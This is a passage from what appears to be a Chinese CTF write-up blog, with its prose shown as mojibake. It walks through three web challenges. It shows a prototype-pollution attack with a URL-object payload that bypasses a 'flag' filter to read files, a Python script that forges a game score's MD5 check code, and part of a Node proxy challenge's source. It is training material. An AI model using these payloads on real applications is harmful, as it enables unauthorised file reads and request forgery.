user.token)</code>ï¼Œè¿™é‡Œmoneyè‚¯å®šæ˜¯è¶³å¤Ÿçš„ã€‚æ³¨æ„è¿™ä¸ª<code>user.token</code>:</p><p><img src="/img/cbshop5.png" alt="cbshop5"></p><p><code>user</code>å˜é‡åªå®šä¹‰äº†<code>username</code>å’Œ<code>money</code>å±æ€§ï¼Œç›´æ¥åœ¨è¯·æ±‚ä½“é‡ŒåŠ <code>token:true</code>å¹¶ä¸æ»¡è¶³è¦æ±‚ï¼š</p><p><img src="/img/cbshop6.png" alt="cbshop6"></p><p>é‚£æ€ä¹ˆæ ·æ‰èƒ½ä½¿<code>user.token</code>ä¸º<code>True</code>å‘¢ï¼Ÿè¿™é‡Œæƒ³åˆ°å¯ä»¥å»ç”¨åŸå‹é“¾æ±¡æŸ“ç›´æ¥â€œå˜â€å‡ºä¸€ä¸ª<code>token</code>æ¥ã€‚è™½ç„¶<code>user</code>å˜è„¸ä¸å­˜åœ¨<code>token</code>å±æ€§ï¼Œä½†<code>js</code>ä½¿ç”¨åŸå‹ç»§æ‰¿ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åŸå‹é“¾ç»§æ‰¿å±æ€§å’Œæ–¹æ³•ã€‚<code>user</code>å¦‚æœæ²¡æœ‰tokenè¿™ä¸ªå±æ€§å®ƒä¼šå¾€ä¸Šæ‰¾ã€‚</p><p>ä½†å¦‚ä½•è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Ÿ</p><p>åŸå‹é“¾æ±¡æŸ“æ¯”è¾ƒå¸¸è§çš„å‡½æ•°æœ‰<code>merge</code>,<code>copy</code>ï¼Œæ¯”å¦‚<code>merge(aa,bb)</code>è¿™ç§ã€‚ä½†è¿™é¢˜æ²¡å‡ºç°è¿™ä¿©å‡½æ•°ï¼Œä¸è¿‡æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/cbshop8.png" alt="cbshop8"></p><p>ä»¤<code>order</code>ä¸ºç©ºå¯¹è±¡ï¼Œç„¶åè¿›è¡Œ<code>assign(order[user.username], product)</code>è¿™ä¹ˆä¸ªç±»ä¼¼mergeçš„æ“ä½œã€‚</p><p>çœ‹ä¸‹å®ƒçš„å®šä¹‰ï¼š</p><p><img src="/img/cbshop7.png" alt="cbshop7"></p><p>ç„¶å<code>/buy</code>è·¯ç”±ä¸‹å®šä¹‰äº†<code>order=buyApi(user,req.body)</code>ã€‚ç°åœ¨çš„æ€è·¯å°±æ˜¯ä»¤<code>user.username</code>ä¸º<code>__proto__</code>ç„¶åè¯·æ±‚ä½“é‡Œæ”¾ä¸ª<code>&quot;token&quot;:true</code>å°±è¡Œã€‚<code>assign</code>å®Œäº†å°±è¡Œ<code>Order.__proto__</code>ä¸‹å­˜åœ¨<code>token:true</code>ã€‚(<code>user</code> å’Œ <code>order</code> çš„åŸå‹éƒ½æ˜¯ <code>Object</code>ã€‚)</p><p>è¿™é‡Œå¯ä»¥å»ºä¸ªç”¨æˆ·åä¸º<code>__proto__</code>çš„ç„¶åè¿›<code>/buy</code>è·¯ç”±è§¦å‘ï¼Œä¹Ÿèƒ½é€šè¿‡<code>/changeUsername</code>çš„è·¯ç”±æ”¹amdinçš„ç”¨æˆ·åç„¶åè§¦å‘ï¼š</p><p><img src="/img/cbshop10.png" alt="cbshop10"></p><p>ç„¶åå°±èƒ½è¿›ä¸‹ä¸€ä¸ª<code>if</code>äº†ï¼š</p><p><img src="/img/cbshop11.png" alt="cbshop11"></p><p>çœ‹ä¸‹é€»è¾‘ï¼š</p><p><img src="/img/cbshop12.png" alt="cbshop12"></p><p>åˆ¤æ–­è¯·æ±‚ä½“é‡Œæœ‰æ²¡æœ‰flagå­—æ®µï¼Œä¸å­˜åœ¨æ‰ä¼šå¯¹<code>product.name</code>è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ª<code>flag</code>å…³é”®å­—çš„åˆ¤æ–­ã€‚</p><p><a href="https://blog.csdn.net/not_code_god/article/details/126953258">å‚è€ƒæ–‡ç« </a></p><p><code>readFileSync</code>è¿™ä¸ªåŸç”Ÿå‡½æ•°å…¶å®æ˜¯å¯ä»¥ä¼ å…¥ä¸€ä¸ªURLå¯¹è±¡çš„ï¼ŒURLå¯¹è±¡ä¼šè‡ªåŠ¨URLè§£ç ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡URLç¼–ç ç»•è¿‡wafäº†ã€‚ä½†æ³¨æ„ä¸èƒ½ä»…ä»…æŠŠ<code>req.body</code>é‡Œ<code>name</code>å­—æ®µçš„å€¼URLç¼–ç ï¼Œè¿™é‡Œè¦ä¼ è¿‡å»ä¸€ä¸ªURLå¯¹è±¡ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;file:///fl%61g&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/cbshop13.png" alt="cbshop13"></p><p>æŠŠè¿™ä¸ªä¸œè¥¿æ•´ä½“ç»™nameå­—æ®µå°±è¡Œï¼Œä¸è¿‡ä¸çŸ¥é“ä¸ºå•¥æˆ‘çœ‹å…¶ä»–äººå†™çš„wpäº¤è¿™ä¸ªå¯ä»¥æˆ‘çš„å°±ä¸è¡Œã€‚ã€‚</p><p>åªæœ‰åˆ æ‰ä¸€äº›å­—æ®µåæ‰æ­£å¸¸ï¼š</p><p><img src="/img/cbshop14.png" alt="cbshop14"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;href&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;origin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;pathname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/fl%61g&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;file:&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>å‰ç«¯å°æ¸¸æˆï¼Œå¤Ÿ1000000åˆ†ç»™flagã€‚</p><p><img src="/img/dino3d1.png" alt="dino3d1"></p><p>ä»–è¿™ä¸ªæ¸¸æˆç»“æŸä¼šå‘ä¸ªæ•°æ®åŒ…å‡ºå»ï¼Œä½†æ²¡æ³•ç›´æ¥æ”¹ï¼Œå­˜åœ¨<code>checkcode</code>éªŒè¯(æ³¨æ„è¿™ä¸ª<code>check.php</code>æ²¡æ³•ç›´æ¥è®¿é—®)ï¼š</p><p><img src="/img/dino3d2.png" alt="dino3d2"></p><p>ç„¶å<code>view-source</code>ç›´æ¥åœ¨é‚£ä¸€å †<code>js</code>æ–‡ä»¶é‡Œå—¯æœå¸¦<code>check.php</code>çš„å†…å®¹ï¼š</p><p><img src="/img/d3node.png" alt="d3node"></p><p>æ•´ç†ä¸‹è¿™æ®µjs:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå‚æ•°ä¸º eï¼ˆåˆ†æ•°ï¼‰å’Œ tï¼ˆæ£€æŸ¥ç ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sn</span>(<span class="hljs-params">e, t</span>) &#123;<br>    <span class="hljs-comment">// ç¡®ä¿ e å’Œ t å‡ä¸ä¸ºå‡å€¼</span><br>    <span class="hljs-keyword">if</span> (e &amp;&amp; t) &#123;<br>        <span class="hljs-comment">// ä½¿ç”¨ fetch æ–¹æ³•å‘é€ POST è¯·æ±‚</span><br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/check.php&quot;</span>, &#123;<br>            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>            <span class="hljs-attr">headers</span>: &#123;<br>                <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><br>            &#125;,<br>            <span class="hljs-comment">// è¯·æ±‚ä½“åŒ…å«åˆ†æ•°ï¼ˆscoreï¼‰ã€æ£€æŸ¥ç ï¼ˆcheckCodeï¼‰ã€æ—¶é—´æˆ³ï¼ˆtmï¼‰</span><br>            <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;score=&quot;</span> + <span class="hljs-built_in">parseInt</span>(e).<span class="hljs-title function_">toString</span>() + <span class="hljs-comment">// å°†åˆ†æ•°è½¬æ¢ä¸ºæ•´æ•°å¹¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br>                  <span class="hljs-string">&quot;&amp;checkCode=&quot;</span> + <span class="hljs-title function_">md5</span>(<span class="hljs-built_in">parseInt</span>(e).<span class="hljs-title function_">toString</span>() + t) + <span class="hljs-comment">// ä½¿ç”¨ MD5 åŠ å¯†ç”Ÿæˆæ£€æŸ¥ç </span><br>                  <span class="hljs-string">&quot;&amp;tm=&quot;</span> + (+<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) <span class="hljs-comment">// è·å–å½“å‰æ—¶é—´æˆ³å¹¶æˆªå–å‰10ä½</span><br>        &#125;)<br>        <span class="hljs-comment">// å¤„ç† fetch è¿”å›çš„ Promiseï¼Œè§£ææˆæ–‡æœ¬æ ¼å¼</span><br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">text</span>())<br>        <span class="hljs-comment">// å¤„ç†è¿”å›çš„æ–‡æœ¬ç»“æœï¼Œå¼¹å‡ºè­¦å‘Šæ¡†æ˜¾ç¤ºç»“æœ</span><br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title function_">alert</span>(e));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®šä¹‰äº†å‡½æ•°<code>sn</code>ï¼Œè¿™ä¸ª<code>e</code>å¯ä»¥çŒœåˆ°åº”è¯¥æ˜¯åˆ†æ•°ï¼Œä½†<code>t</code>æ˜¯ä»€ä¹ˆä¸çŸ¥é“ï¼Œç»§ç»­æœæ˜¯å¦æœ‰å…¶å®ƒåœ°æ–¹è°ƒç”¨äº†è¿™ä¸ª<code>sn</code>å‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> game.<span class="hljs-title function_">sn</span>(score.<span class="hljs-property">score</span>,checkCode)<br><span class="hljs-comment">//åŒä¸ŠæœcheckCode:</span><br><span class="hljs-keyword">var</span> checkCode=<span class="hljs-string">&quot;DASxCBCTF&quot;</span>+salt<br><span class="hljs-comment">//åŒä¸Šæœsalt</span><br><span class="hljs-keyword">var</span> salt=<span class="hljs-string">&quot;_wElc03e&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://node5.buuoj.cn:26373/check.php&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><br>&#125;<br><br>body = &#123;<br>    <span class="hljs-string">&quot;score&quot;</span>: <span class="hljs-string">&quot;10000000&quot;</span>,<br>    <span class="hljs-string">&quot;checkCode&quot;</span>: md5(<span class="hljs-string">&quot;10000000DASxCBCTF_wElc03e&quot;</span>.encode()).hexdigest(),<br>    <span class="hljs-string">&quot;tm&quot;</span>: <span class="hljs-built_in">str</span>((time.time()))[:<span class="hljs-number">10</span>]<br>&#125;<br><br>res = requests.post(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åœ¨æ§åˆ¶å°æ‰“ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;DASxCBCTF_wElc03e&quot;</span>;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(game.sn(<span class="hljs-number">10000000</span>, s));<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/not_code_god/article/details/126953258">å‚è€ƒæ–‡ç« </a></p><p>ä¸è¿‡è¿™ä¸¤ç§æ–¹æ³•æˆ‘éƒ½æ²¡æˆåŠŸã€‚ã€‚æ˜æ˜ç…§ç€wpå†™çš„ğŸ˜µ</p><h2 id="CTFSHOW766"><a href="#CTFSHOW766" class="headerlink" title="CTFSHOW766"></a>CTFSHOW766</h2><p><code>/source</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// node 8.12.0</span><br><span class="hljs-keyword">const</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// ä»æ–‡ä»¶ä¸­åŠ è½½ flag</span><br><span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br><br><span class="hljs-comment">// Session ç®¡ç†</span><br><span class="hljs-keyword">let</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">FileStore</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;session-file-store&#x27;</span>)(session);<br><span class="hljs-keyword">let</span> identityKey = <span class="hljs-string">&#x27;session&#x27;</span>;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">name</span>: identityKey,<br>  <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">store</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileStore</span>(),<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">cookie</span>: &#123;<br>    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">600</span><br>  &#125;<br>&#125;));<br><br><span class="hljs-comment">// ä¸­é—´ä»¶</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">logger</span>(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span>&#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><span class="hljs-comment">// ä¸­é—´ä»¶ç”¨äºè®¾ç½®é»˜è®¤ä¼šè¯å€¼</span><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> === <span class="hljs-literal">undefined</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-string">&quot;guest&quot;</span>;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br><span class="hljs-comment">// è·¯ç”±å¤„ç†ç¨‹åº</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Node Proxy&#x27;</span>, <span class="hljs-attr">username</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/test&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;test test&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/app.js&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> !== <span class="hljs-literal">undefined</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">false</span>;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;You have registered successfully!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;No username provided!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/verify&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">checkIP</span>(req) !== <span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;You are not from LOCAL!&#x27;</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">body</span>.<span class="hljs-property">token</span>;<br>  <span class="hljs-keyword">if</span> (token === <span class="hljs-string">&#x27;you_will_never_know&#x27;</span> &amp;&amp; req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">true</span>;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;VERIFIED SUCCESS!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> !== <span class="hljs-literal">true</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO! Your are not verified!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: flag&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO! Your are not admin!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/proxy&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> url = req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span> ? req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (url) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      http.<span class="hljs-title function_">get</span>(url, <span class="hljs-function">(<span class="hljs-params">r</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> &#123;statusCode&#125; = r;<br>        <span class="hljs-keyword">if</span> (r &amp;&amp; statusCode === <span class="hljs-number">200</span>) &#123;<br>          r.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>          <span class="hljs-keyword">let</span> data = <span class="hljs-string">&#x27;&#x27;</span>;<br>          r.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>            data += chunk;<br>          &#125;);<br>          r.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>            res.<span class="hljs-title function_">send</span>(data);<br>          &#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;error&#x27;</span>&#125;);<br>        &#125;<br>      &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">code</span> === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>          res.<span class="hljs-title function_">send</span>(<span 